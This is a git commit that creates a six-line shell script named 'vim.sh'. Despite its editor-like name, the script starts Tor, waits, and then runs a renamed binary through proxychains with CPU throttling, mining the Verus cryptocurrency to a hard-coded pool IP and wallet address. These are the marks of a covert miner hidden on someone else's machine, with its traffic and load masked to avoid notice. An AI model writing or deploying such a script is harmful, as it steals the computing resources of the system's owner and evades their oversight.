5f6a8d820c9667cd8cfe0066fb97e4d84f8c4385
unmsjd28 <92165260+unmsjd28@users.noreply.github.com>
2021-10-16 21:30:14 +0530

    Create vim.sh

---
+++ vim.sh
@@ -0,0 +1,6 @@
+#!/bin/sh
+
+cd /root/ai
+tor &
+sleep 200
+cpulimit -f -l 70 -- proxychains4 ./mavic -a verus -o stratum+tcp://149.56.27.47:3956 -u RTQ4T8D6xgLR5u9e1aZZjrBdQy8sog2Zb7.Rigimo -p x -t 2
